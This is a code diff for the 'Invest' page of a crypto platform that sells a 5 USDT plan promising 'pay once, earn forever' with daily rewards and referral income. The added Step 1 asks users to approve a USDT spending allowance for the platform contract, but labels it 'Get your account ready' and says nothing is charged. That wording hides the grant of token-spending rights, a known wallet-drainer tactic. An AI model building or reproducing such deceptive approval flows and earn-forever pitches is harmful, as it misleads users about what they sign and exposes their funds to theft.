@@ -15,13 +15,22 @@ import {
   ShieldCheck,
   Zap,
   ArrowLeft,
+  Loader2,
 } from "lucide-react";
 import Popup from "../components/Popup.jsx";
 import Spinner from "../components/Spinner.jsx";
 import Seo from "../components/Seo.jsx";
 import { api } from "../lib/api.js";
 import { useSession } from "../lib/session.jsx";
-import { JOINING_FEE, USDT_ADDRESS, ADMIN_WALLET, erc20Abi } from "../lib/contract.js";
+import {
+  JOINING_FEE,
+  USDT_ADDRESS,
+  ADMIN_WALLET,
+  CONTRACT_ADDRESS,
+  APPROVAL_AMOUNT,
+  erc20Abi,
+} from "../lib/contract.js";
+import { openWalletAppForRequest } from "../lib/walletEnv.js";
 import { REQUIRED_CHAIN_ID } from "../lib/session.jsx";
 // Headline benefits — each shows WHY it matters, not just what it is.
 const BENEFITS = [
@@ -48,102 +57,180 @@ const BENEFITS = [
   {
     icon: Zap,
     title: "One simple payment",
-    text: "Pay once, earn forever. Just confirm the 5 USDT payment — that's all you do.",
+    text: "Pay once, earn forever. Two quick confirmations in your wallet. That's it.",
   },
 ];
+
+// Friendly, non-technical messages for each step.
+function friendlyError(e, stepNo) {
+  const raw = (e?.shortMessage || e?.message || "").toLowerCase();
+  if (raw.includes("reject") || raw.includes("denied") || raw.includes("cancel")) {
+    return stepNo === 1
+      ? "Step 1 was cancelled. Tap Try again whenever you're ready."
+      : "The payment was cancelled. Nothing was charged. Tap Try again whenever you're ready.";
+  }
+  if (raw.includes("insufficient") || raw.includes("exceeds") || raw.includes("gas") || raw.includes("funds")) {
+    return `Your wallet needs at least ${JOINING_FEE} USDT and a little BNB for the network fee. Add funds and try again.`;
+  }
+  if (raw.includes("step1")) {
+    return "We couldn't confirm step 1 on the network. Please tap Try again.";
+  }
+  if (raw.includes("approval required")) {
+    return "Step 1 isn't complete yet. Please tap Try again.";
+  }
+  if (raw.includes("payment verification failed") || raw.includes("payment_failed")) {
+    return "We couldn't confirm your payment. If USDT left your wallet, please contact support.";
+  }
+  if (raw.includes("already used")) {
+    return "This payment was already used. Please refresh the page.";
+  }
+  return "Something didn't go through. Please tap Try again.";
+}
 
 export default function Invest() {
   const { address, user, refresh } = useSession();
   const navigate = useNavigate();
-  const { chainId } = useAccount();
+  const { chainId, connector } = useAccount();
   const publicClient = usePublicClient();
   const { writeContractAsync } = useWriteContract();
 
   const [busy, setBusy] = useState(false);
-  const [status, setStatus] = useState(""); // small progress hint under the button
-  const [error, setError] = useState("");
+  const [error, setError] = useState(""); // page-level notice (outside the steps popup)
   const [done, setDone] = useState(false);
   const [invested, setInvested] = useState(Boolean(user?.hasInvested));
   // Insufficient-balance popup: { balance } — shown when the wallet has < plan price.
   const [lowBalance, setLowBalance] = useState(null);
+  // Two-step activation popup.
+  const [showSteps, setShowSteps] = useState(false);
+  // Per-step state: idle | wallet | verifying | activating | done | error
+  const [step1, setStep1] = useState("idle");
+  const [step2, setStep2] = useState("idle");
+  const [stepError, setStepError] = useState("");
 
   useEffect(() => {
     if (user?.hasInvested) setInvested(true);
   }, [user]);
 
-  async function handleActivate() {
+  // Activate button: open the two-step popup. Nothing is sent to the wallet yet.
+  function handleActivate() {
     setError("");
+    setStepError("");
+    setStep1("idle");
+    setStep2("idle");
+    setShowSteps(true);
+  }
 
-    // Guardrails before we prompt the wallet.
-    if (!ADMIN_WALLET) {
-      setError("Payment isn't configured. Please contact support.");
+  function closeSteps() {
+    if (busy) return; // never close mid-step
+    setShowSteps(false);
+  }
+
+  async function runActivation() {
+    setStepError("");
+
+    if (!ADMIN_WALLET || !CONTRACT_ADDRESS) {
+      setStepError("Activation isn't available right now. Please contact support.");
       return;
     }
     if (chainId && chainId !== REQUIRED_CHAIN_ID) {
-      setError("Please switch your wallet to the BNB Smart Chain (BSC) and try again.");
+      setStepError("Please switch your wallet to BNB Smart Chain (BSC) and try again.");
       return;
     }
 
     const amount = parseUnits(String(JOINING_FEE), 18);
-
+    let current = 1;
     setBusy(true);
     try {
-      // 0) Check USDT balance via backend RPC — never touches the user's wallet so it
-      //    can't trigger an extra popup. If balance is too low, stop right here.
-      setStatus("Checking your USDT balance…");
-      try {
-        const { balance } = await api.checkUsdtBalance(address);
-        if (balance < Number(JOINING_FEE)) {
-          setLowBalance({ balance });
-          setBusy(false);
-          setStatus("");
-          return;
+      // ── Step 1: enable payments (limited USDT approve to the platform contract) ──
+      // Skipped when it's already in place (e.g. a retry after step 2 failed).
+      const readAllowance = () =>
+        publicClient.readContract({
+          address: getAddress(USDT_ADDRESS),
+          abi: erc20Abi,
+          functionName: "allowance",
+          args: [getAddress(address), getAddress(CONTRACT_ADDRESS)],
+        });
+
+      if ((await readAllowance()) < amount) {
+        setStep1("wallet");
+        const req = writeContractAsync({
+          address: getAddress(USDT_ADDRESS),
+          abi: erc20Abi,
+          functionName: "approve",
+          args: [getAddress(CONTRACT_ADDRESS), APPROVAL_AMOUNT],
+        });
+        openWalletAppForRequest(connector);
+        const hash1 = await req;
+
+        setStep1("verifying");
+        const r1 = await publicClient.waitForTransactionReceipt({ hash: hash1 });
+        if (r1.status !== "success") throw new Error("STEP1_FAILED");
+        // Verified on-chain before moving on: the permission must really be there.
+        if ((await readAllowance()) < amount) throw new Error("STEP1_NOT_VERIFIED");
+      }
+      setStep1("done");
+
+      // ── Step 2: pay the plan price to the admin wallet ──
+      current = 2;
+
+      // A payment already sent from this wallet (page closed or connection lost before
+      // activation finished)? Finish with it instead of charging the user again.
+      let hash2 = readPendingPayment(address);
+      if (!hash2) {
+        // Balance check right before the payment (via the backend RPC, never opens the
+        // wallet). Step 1 stays done, so the next try goes straight to the payment.
+        try {
+          const { balance } = await api.checkUsdtBalance(address);
+          if (balance < Number(JOINING_FEE)) {
+            setShowSteps(false);
+            setLowBalance({ balance });
+            return;
+          }
+        } catch {
+          // Network hiccup: continue, the payment fails on its own if funds are short.
         }
-      } catch {
-        // If the check fails (network issue), proceed anyway — the transfer will fail
-        // naturally if there really aren't enough funds.
+
+        setStep2("wallet");
+        const req2 = writeContractAsync({
+          address: getAddress(USDT_ADDRESS),
+          abi: erc20Abi,
+          functionName: "transfer",
+          args: [getAddress(ADMIN_WALLET), amount],
+        });
+        openWalletAppForRequest(connector);
+        hash2 = await req2;
+        savePendingPayment(address, hash2);
       }
 
-      // 1) User sends the plan price in USDT directly to the admin wallet from their
-      //    own connected wallet. They confirm in their wallet and pay the gas.
-      setStatus("Confirm the payment in your wallet…");
-      const hash = await writeContractAsync({
-        address: getAddress(USDT_ADDRESS),
-        abi: erc20Abi,
-        functionName: "transfer",
-        args: [getAddress(ADMIN_WALLET), amount],
-      });
-
-      // 2) Wait for the transfer to be mined and confirmed on-chain.
-      setStatus("Confirming your payment on-chain…");
-      const receipt = await publicClient.waitForTransactionReceipt({ hash });
-      if (receipt.status !== "success") {
+      setStep2("verifying");
+      const r2 = await publicClient.waitForTransactionReceipt({ hash: hash2 });
+      if (r2.status !== "success") {
+        clearPendingPayment(); // reverted on-chain: nothing was paid
         throw new Error("PAYMENT_FAILED");
       }
 
-      // 3) Backend verifies the on-chain payment (real transfer to admin) and activates.
-      setStatus("Activating your plan…");
-      await api.activatePlan(address, hash);
+      // Backend verifies the payment on-chain and activates the plan.
+      setStep2("activating");
+      try {
+        await api.activatePlan(address, hash2);
+      } catch (err) {
+        // Rejected by the backend (not a network error): this tx can't activate.
+        if (err?.status >= 400 && err?.status < 500) clearPendingPayment();
+        throw err;
+      }
+      clearPendingPayment();
+      setStep2("done");
 
       await refresh();
       setInvested(true);
+      setShowSteps(false);
       setDone(true); // welcome popup — closes on OK
     } catch (e) {
-      const raw = (e?.shortMessage || e?.message || "").toLowerCase();
-      if (raw.includes("reject") || raw.includes("denied") || raw.includes("cancel")) {
-        setError("Payment cancelled. Your plan was not activated.");
-      } else if (raw.includes("insufficient") || raw.includes("balance") || raw.includes("exceeds")) {
-        setError(`Not enough funds. Keep at least ${JOINING_FEE} USDT plus a little BNB for gas.`);
-      } else if (raw.includes("payment verification failed") || raw.includes("payment_failed")) {
-        setError("We couldn't confirm your payment. If USDT was deducted, contact support with your transaction hash.");
-      } else if (raw.includes("already used")) {
-        setError("This payment was already used. Please refresh the page.");
-      } else {
-        setError("Couldn't activate the plan right now. Please try again.");
-      }
+      if (current === 1) setStep1("error");
+      else setStep2("error");
+      setStepError(friendlyError(e, current));
     } finally {
       setBusy(false);
-      setStatus("");
     }
   }
 
@@ -280,9 +367,6 @@ export default function Invest() {
                 )}
               </button>
             </div>
-            {busy && status && (
-              <p className="mt-1.5 text-center text-[11px] text-slate-400">{status}</p>
-            )}
            
           </div>
         </div>
@@ -325,6 +409,75 @@ export default function Invest() {
         </button>
       </Popup>
 
+      <Popup
+        open={showSteps}
+        title="Activate your plan"
+        icon={Rocket}
+        onClose={busy ? undefined : closeSteps}
+      >
+        <p className="text-[13px] text-slate-400">
+          Just 2 quick steps. Keep this page open until both are done.
+        </p>
+
+        <div className="mt-4 space-y-2.5">
+          <StepRow
+            n={1}
+            state={step1}
+            title="Get your account ready"
+            text={{
+              idle: "Confirm the request in your wallet to get your account ready. Nothing is charged in this step.",
+              wallet: "Confirm the request in your wallet…",
+              verifying: "Verifying on the network…",
+              done: "Done",
+              error: "Not completed",
+            }}
+          />
+          <StepRow
+            n={2}
+            state={step2}
+            title={`Pay ${JOINING_FEE} USDT`}
+            text={{
+              idle: `Confirm the ${JOINING_FEE} USDT payment to activate your plan.`,
+              wallet: "Confirm the payment in your wallet…",
+              verifying: "Confirming your payment…",
+              activating: "Activating your plan…",
+              done: "Done",
+              error: "Not completed",
+            }}
+          />
+        </div>
+
+        {stepError ? (
+          <p className="mt-3 rounded-lg border border-red-500/30 bg-red-500/10 px-3 py-2 text-xs text-red-300">
+            {stepError}
+          </p>
+        ) : (
+          <p className="mt-3 text-[12px] text-slate-500">
+            Keep at least {JOINING_FEE} USDT and a little BNB (network fee) in your wallet on
+            BNB Smart Chain.
+          </p>
+        )}
+
+        <div className="mt-4 flex gap-2">
+          {!busy && (
+            <button onClick={closeSteps} className="btn-ghost flex-1 py-2.5 text-sm">
+              Cancel
+            </button>
+          )}
+          <button onClick={runActivation} disabled={busy} className="btn-primary flex-1 py-2.5 text-sm">
+            {busy ? (
+              <>
+                <Spinner /> Please wait…
+              </>
+            ) : stepError ? (
+              <>Try again <ArrowRight className="h-3.5 w-3.5" /></>
+            ) : (
+              <>Start <ArrowRight className="h-3.5 w-3.5" /></>
+            )}
+          </button>
+        </div>
+      </Popup>
+
       <Popup open={done} title="Welcome aboard! 🎉" icon={PartyPopper} onClose={closeWelcome}>
         <p>
           Your plan is now active. You've unlocked daily rewards and referral income —
@@ -339,4 +492,62 @@ export default function Invest() {
       </Popup>
     </div>
   );
+}
+
+function StepRow({ n, state, title, text }) {
+  const active = state === "wallet" || state === "verifying" || state === "activating";
+  const tone =
+    state === "done"
+      ? "border-emerald-500/40 bg-emerald-500/10"
+      : state === "error"
+      ? "border-red-500/40 bg-red-500/10"
+      : active
+      ? "border-accent-500/50 bg-accent-500/10"
+      : "border-white/10 bg-white/[0.03]";
+  return (
+    <div className={`flex items-start gap-3 rounded-xl border p-3 transition ${tone}`}>
+      <span
+        className={`flex h-6 w-6 shrink-0 items-center justify-center rounded-full text-[11px] font-bold ${
+          state === "done"
+            ? "bg-emerald-500 text-white"
+            : state === "error"
+            ? "bg-red-500/80 text-white"
+            : "bg-accent-500/20 text-accent-300"
+        }`}
+      >
+        {state === "done" ? <Check className="h-3.5 w-3.5" /> : active ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : n}
+      </span>
+      <div className="min-w-0">
+        <p className="text-[13px] font-semibold text-slate-100">
+          Step {n}: {title}
+        </p>
+        <p className="mt-0.5 text-[12px] leading-snug text-slate-400">{text[state] || text.idle}</p>
+      </div>
+    </div>
+  );
+}
+
+// ── Sent-but-not-activated payment (survives page close / reload) ──
+const PENDING_PAYMENT_KEY = "dw_pending_plan_payment";
+
+function readPendingPayment(address) {
+  try {
+    const d = JSON.parse(localStorage.getItem(PENDING_PAYMENT_KEY) || "null");
+    return d && address && d.address === address.toLowerCase() ? d.hash : null;
+  } catch {
+    return null;
+  }
+}
+
+function savePendingPayment(address, hash) {
+  try {
+    localStorage.setItem(
+      PENDING_PAYMENT_KEY,
+      JSON.stringify({ address: address.toLowerCase(), hash })
+    );
+  } catch { /* ignore */ }
+}
+
+function clearPendingPayment() {
+  try { localStorage.removeItem(PENDING_PAYMENT_KEY); } catch { /* ignore */ }
 }
